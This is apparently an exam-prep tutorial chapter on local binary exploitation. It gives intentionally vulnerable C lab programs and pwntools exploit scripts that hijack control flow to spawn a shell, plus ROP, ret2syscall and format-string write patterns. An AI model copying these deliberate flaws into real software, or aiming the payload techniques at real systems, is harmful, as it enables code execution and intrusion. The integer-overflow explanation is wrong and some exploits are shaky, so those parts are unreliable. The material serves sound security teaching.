# 11. Practical Exploitation - Vulnerable Programs & Exploits

## Overview
**HANDS-ON PRACTICE** - This guide provides vulnerable programs and complete exploit scripts you can compile and run locally.

---

## 11.1 Setup Your Lab Environment

### Install Required Tools

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y build-essential gdb python3 python3-pip

# Install pwntools
pip3 install pwntools

# Install pwndbg (GDB enhancement)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Install ROPgadget
pip3 install ROPgadget

# Disable ASLR for practice
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## 11.2 Vulnerable Program #1: Basic Stack Overflow

### Source Code (vuln1.c)

```c
/*
 * vuln1.c - Basic Stack Buffer Overflow
 * 
 * Compile:
 *   gcc -fno-stack-protector -z execstack -no-pie vuln1.c -o vuln1
 * 
 * Vulnerability: strcpy with no bounds checking
 * Goal: Overwrite return address to call win()
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("\nüéâ SUCCESS! You called win()!\n");
    printf("Flag: flag{basic_overflow_complete}\n");
    system("/bin/sh");  // Spawn shell
}

void vulnerable(char *input) {
    char buffer[64];
    printf("Buffer is at: %p\n", buffer);
    printf("Input: %s\n", input);
    
    strcpy(buffer, input);  // VULNERABLE!
    
    printf("Returned from strcpy\n");
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\nHints:\n");
        printf("  Buffer size: 64 bytes\n");
        printf("  win() is at: %p\n", win);
        return 1;
    }
    
    printf("=== Vulnerable Program 1 ===\n");
    vulnerable(argv[1]);
    printf("Exiting normally\n");
    return 0;
}
```

### Exploit Script (exploit1.py)

```python
#!/usr/bin/env python3
"""
exploit1.py - Exploit for vuln1
"""

from pwn import *

# Configuration
binary_path = './vuln1'
elf = ELF(binary_path)

# Addresses
win_addr = elf.symbols['win']

print(f"[*] Binary: {binary_path}")
print(f"[*] win() address: {hex(win_addr)}")

# Calculate offset
# Buffer: 64 bytes
# Saved RBP: 8 bytes
# Total: 72 bytes to return address
offset = 72

# Build payload
payload = b'A' * offset           # Fill buffer + saved RBP
payload += p64(win_addr)          # Overwrite return address

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Offset: {offset}")

# Save payload to file
with open('payload1.txt', 'wb') as f:
    f.write(payload)

print("[*] Payload saved to payload1.txt")
print("[*] Execute with: ./vuln1 $(cat payload1.txt)")

# Exploit locally
print("\n[*] Exploiting...")
p = process([binary_path, payload])
p.interactive()
```

### Manual Exploitation

```bash
# Compile
gcc -fno-stack-protector -z execstack -no-pie vuln1.c -o vuln1

# Run exploit
python3 exploit1.py

# Or manually:
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*72 + p64(0x401196))" > payload
./vuln1 "$(cat payload)"
```

---

## 11.3 Vulnerable Program #2: Format String

### Source Code (vuln2.c)

```c
/*
 * vuln2.c - Format String Vulnerability
 * 
 * Compile:
 *   gcc -no-pie -fno-stack-protector vuln2.c -o vuln2
 * 
 * Vulnerability: printf(user_input)
 * Goal: Read secret value from memory
 */

#include <stdio.h>
#include <string.h>

int secret = 0xdeadbeef;

void check_password(char *input) {
    int authenticated = 0;
    char buffer[64];
    
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
    
    printf("Debug output: ");
    printf(buffer);  // VULNERABLE! Should be printf("%s", buffer);
    printf("\n");
    
    if (authenticated) {
        printf("Access granted!\n");
    } else {
        printf("Access denied!\n");
    }
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\nSecret value at: %p\n", &secret);
        printf("Secret value is: 0x%x\n", secret);
        return 1;
    }
    
    printf("=== Format String Challenge ===\n");
    printf("Find the secret value!\n\n");
    
    check_password(argv[1]);
    return 0;
}
```

### Exploit Script (exploit2.py)

```python
#!/usr/bin/env python3
"""
exploit2.py - Format string exploit
"""

from pwn import *

binary = './vuln2'
elf = ELF(binary)

# Find secret address
secret_addr = elf.symbols['secret']
print(f"[*] Secret at: {hex(secret_addr)}")

# Read stack values
print("\n[*] Reading stack with format string:")
p = process([binary, b"%p " * 10])
output = p.recvall()
print(output.decode())
p.close()

# Read specific address
print("\n[*] Reading secret value:")
payload = p64(secret_addr) + b"%7$s"
p = process([binary, payload])
output = p.recvall()
print(output.decode())
p.close()
```

---

## 11.4 Vulnerable Program #3: ROP Challenge

### Source Code (vuln3.c)

```c
/*
 * vuln3.c - ROP Chain Challenge
 * 
 * Compile:
 *   gcc -fno-stack-protector -no-pie vuln3.c -o vuln3
 * 
 * Note: Compile WITHOUT -z execstack (NX enabled)
 * 
 * Vulnerability: Buffer overflow with NX protection
 * Goal: Use ROP chain to call system("/bin/sh")
 */

#include <stdio.h>
#include <string.h>

// Useful gadgets will be found in the binary
void gadget1() {
    __asm__("pop %rdi; ret");
}

void gadget2() {
    __asm__("pop %rsi; ret");
}

char binsh[] = "/bin/sh";

void vulnerable(char *input) {
    char buffer[128];
    
    printf("Buffer at: %p\n", buffer);
    printf("String '/bin/sh' at: %p\n", binsh);
    
    strcpy(buffer, input);  // Overflow!
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\nThis program has NX enabled!\n");
        printf("You must use ROP to spawn a shell.\n");
        return 1;
    }
    
    printf("=== ROP Challenge ===\n");
    vulnerable(argv[1]);
    printf("Exiting normally\n");
    return 0;
}
```

### Exploit Script (exploit3.py)

```python
#!/usr/bin/env python3
"""
exploit3.py - ROP chain to call system()
"""

from pwn import *

# Configuration
binary = './vuln3'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find addresses
binsh_addr = next(elf.search(b'/bin/sh'))
print(f"[*] /bin/sh at: {hex(binsh_addr)}")

# Find ROP gadgets
rop = ROP(elf)

# Try to find pop rdi; ret gadget
try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    print(f"[*] pop rdi; ret at: {hex(pop_rdi)}")
except:
    # Manual gadget search
    print("[!] Auto-finding gadgets failed, using ROPgadget")
    import subprocess
    result = subprocess.run(['ROPgadget', '--binary', binary, '--only', 'pop|ret'],
                          capture_output=True, text=True)
    print(result.stdout)
    pop_rdi = int(input("Enter pop_rdi gadget address (hex): "), 16)

# Find system() in libc
system_addr = elf.plt['system']  # Using PLT entry
print(f"[*] system@plt at: {hex(system_addr)}")

# Calculate offset
offset = 128 + 8  # buffer + saved RBP

# Build ROP chain
print("\n[*] Building ROP chain...")
payload = b'A' * offset
payload += p64(pop_rdi)        # pop rdi; ret
payload += p64(binsh_addr)     # "/bin/sh"
payload += p64(system_addr)    # system()

print(f"[*] Payload size: {len(payload)}")

# Save payload
with open('payload3.txt', 'wb') as f:
    f.write(payload)

print("[*] Payload saved to payload3.txt")

# Exploit
print("\n[*] Launching exploit...")
p = process([binary, payload])
p.interactive()
```

---

## 11.5 Vulnerable Program #4: Integer Overflow

### Source Code (vuln4.c)

```c
/*
 * vuln4.c - Integer Overflow leading to Buffer Overflow
 * 
 * Compile:
 *   gcc -fno-stack-protector vuln4.c -o vuln4
 * 
 * Vulnerability: Integer overflow in size calculation
 * Goal: Trigger overflow and read secret
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char secret[] = "flag{integer_overflow_bypassed_check}";

void process_data(unsigned int size, char *data) {
    char buffer[64];
    
    // Check looks safe...
    if (size > sizeof(buffer)) {
        printf("Size too large!\n");
        return;
    }
    
    // But this can overflow!
    memcpy(buffer, data, size);
    
    printf("Processed %u bytes\n", size);
}

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s <size> <data>\n", argv[0]);
        printf("\nSecret at: %p\n", secret);
        printf("Try to overflow the buffer!\n");
        return 1;
    }
    
    unsigned int size = atoi(argv[1]);
    char *data = argv[2];
    
    printf("=== Integer Overflow Challenge ===\n");
    printf("Processing %u bytes...\n", size);
    
    process_data(size, data);
    
    printf("Done!\n");
    return 0;
}
```

### Exploit Explanation

```python
#!/usr/bin/env python3
"""
exploit4.py - Integer overflow exploit

The vulnerability:
1. size is unsigned int (32-bit)
2. If we wrap around (e.g., -1 becomes 0xFFFFFFFF)
3. Check passes: 0xFFFFFFFF > 64 is FALSE in unsigned
   (because it wraps)
4. But memcpy uses size_t, interprets as huge number
5. Buffer overflow!
"""

# This won't work as expected because size is parsed as unsigned
# The point is to understand the vulnerability

# In a real exploit:
# - Find a way to make size wrap to small value
# - Or exploit signed/unsigned confusion
# - Or use integer overflow in calculation before check

print("[*] Integer overflow concept:")
print("    Unsigned int range: 0 to 4,294,967,295")
print("    If size = 0xFFFFFFFF (-1 as signed)")
print("    Check: 0xFFFFFFFF > 64 evaluates based on type")
print("    Memcpy then uses this huge 'size'")
```

---

## 11.6 Vulnerable Program #5: Use-After-Free

### Source Code (vuln5.c)

```c
/*
 * vuln5.c - Use-After-Free Vulnerability
 * 
 * Compile:
 *   gcc -no-pie vuln5.c -o vuln5
 * 
 * Vulnerability: Accessing freed memory
 * Goal: Control freed object to call admin function
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*greet)(char *);
} User;

void regular_greeting(char *name) {
    printf("Hello, %s!\n", name);
}

void admin_greeting(char *name) {
    printf("üîì Admin access granted for %s!\n", name);
    printf("Flag: flag{use_after_free_success}\n");
    system("/bin/sh");
}

User *create_user(char *name) {
    User *user = malloc(sizeof(User));
    strncpy(user->name, name, sizeof(user->name) - 1);
    user->greet = regular_greeting;
    return user;
}

void greet_user(User *user) {
    if (user) {
        user->greet(user->name);
    }
}

int main() {
    printf("=== Use-After-Free Challenge ===\n");
    printf("admin_greeting() at: %p\n\n", admin_greeting);
    
    // Create user
    User *user1 = create_user("Alice");
    greet_user(user1);
    
    // Free user
    printf("\nFreeing user...\n");
    free(user1);
    
    // Use after free!
    printf("Creating new data in freed space...\n");
    
    // Allocate new object of same size
    User *user2 = malloc(sizeof(User));
    strcpy(user2->name, "Bob");
    user2->greet = admin_greeting;  // Point to admin function!
    
    // This will call user1->greet, which is now user2's data
    printf("\nCalling freed user's greet function...\n");
    greet_user(user1);  // UAF - still points to freed memory!
    
    return 0;
}
```

### Exploit Analysis

```python
#!/usr/bin/env python3
"""
exploit5_analysis.py

UAF Exploitation:

1. Program allocates User object
2. User freed
3. Memory returned to heap
4. New allocation of same size reuses freed memory
5. Old pointer (user1) still points to freed location
6. When user1->greet() called, executes new object's function pointer
7. If attacker controls new allocation, they control execution

This example shows the concept automatically.
In real exploits:
- Spray heap with controlled data
- Trigger UAF
- Control function pointer or vtable
- Achieve code execution
"""

print("UAF Exploitation requires:")
print("1. Object with function pointer freed")
print("2. Ability to allocate new object in freed space")
print("3. Old pointer still used")
print("4. Control over new object content")
print("\nRun vuln5 to see it in action!")
```

---

## 11.7 Debugging with GDB

### GDB Commands for Exploitation

```bash
# Start GDB
gdb ./vuln1

# Set breakpoints
(gdb) break vulnerable
(gdb) break *0x401196  # Break at address

# Run with arguments
(gdb) run $(python3 -c "print('A'*100)")

# Examine registers
(gdb) info registers
(gdb) print $rsp
(gdb) print $rbp
(gdb) print $rip

# Examine memory
(gdb) x/20x $rsp              # 20 hex words at stack
(gdb) x/gx $rbp+8             # Return address
(gdb) x/s 0x401234            # String at address
(gdb) x/i $rip                # Instruction at RIP

# Stack analysis
(gdb) backtrace               # Call stack
(gdb) frame 0                 # Select frame
(gdb) info frame              # Frame details

# Stepping
(gdb) next                    # Next line (step over)
(gdb) step                    # Step into function
(gdb) nexti                   # Next instruction
(gdb) stepi                   # Step one instruction
(gdb) continue                # Continue execution

# Pattern generation (with pwndbg)
pwndbg> cyclic 200            # Generate pattern
pwndbg> cyclic -l 0x61616162  # Find offset
pwndbg> telescope $rsp 20     # Pretty print stack
pwndbg> vmmap                 # Memory mappings
```

### Example Debugging Session

```bash
$ gdb ./vuln1

(gdb) disassemble vulnerable
# Find vulnerable function

(gdb) break vulnerable
Breakpoint 1 at 0x401180

(gdb) run $(python3 -c "print('A'*100)")
# Hits breakpoint

(gdb) x/20x $rsp
# Examine stack before overflow

(gdb) next
# Execute strcpy

(gdb) x/20x $rsp
# Stack now overwritten with 'A's

(gdb) x/gx $rbp+8
# Return address should be 0x4141414141414141

(gdb) continue
# Segfault at 0x4141414141414141
# Confirms we control RIP!
```

---

## 11.8 Common Exploit Patterns

### Pattern 1: ret2win (Return to Win Function)

```python
offset = find_offset()
win_addr = elf.symbols['win']

payload = b'A' * offset
payload += p64(win_addr)
```

### Pattern 2: ret2libc (Return to Libc)

```python
pop_rdi = find_gadget("pop rdi; ret")
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

### Pattern 3: ret2syscall

```python
# execve("/bin/sh", NULL, NULL)
pop_rax = find_gadget("pop rax; ret")
pop_rdi = find_gadget("pop rdi; ret")
pop_rsi = find_gadget("pop rsi; ret")
pop_rdx = find_gadget("pop rdx; ret")
syscall = find_gadget("syscall; ret")

payload = b'A' * offset
payload += p64(pop_rax) + p64(59)        # execve
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
```

### Pattern 4: Format String Arbitrary Write

```python
# Write value to address
target_addr = 0x601234
value = 0xdeadbeef

# %n writes number of bytes printed so far
payload = p64(target_addr)
payload += b"%8x" * 7          # Align to correct offset
payload += b"%n"               # Write to target_addr
```

---

## üéØ Practice Exercises

### Exercise 1: Basic Overflow
1. Compile vuln1.c
2. Find the offset to return address
3. Write exploit to call win()
4. Verify you get a shell

### Exercise 2: Format String
1. Compile vuln2.c
2. Leak stack values with %p
3. Find secret value in memory
4. Read secret using format string

### Exercise 3: ROP Chain
1. Compile vuln3.c (with NX)
2. Find ROP gadgets
3. Build chain to call system("/bin/sh")
4. Get shell without executable stack

### Exercise 4: Modify Existing
1. Take vuln1.c
2. Add stack canary
3. Bypass canary by leaking it first
4. Still achieve code execution

---

## üìù Quick Reference

```
COMPILATION FLAGS:
-fno-stack-protector    : Disable canaries
-z execstack            : Make stack executable
-no-pie                 : Disable ASLR for binary
-static                 : Static linking (larger binary)

PWNTOOLS BASICS:
elf = ELF('./binary')
elf.symbols['function']  : Get function address
p64(addr)                : Pack 64-bit address
cyclic(200)              : Generate de Bruijn pattern
process(['./binary', arg]) : Run locally

GDB COMMANDS:
break function          : Set breakpoint
run args                : Execute with arguments
x/20x $rsp             : Examine stack
info registers         : Show all registers
disassemble function   : Disassemble function
```

---

[‚Üê Previous: Assembly Basics](./10-assembly-basics.md) | [Back to Main ‚Üí](../EXAM-PREP-README.md)
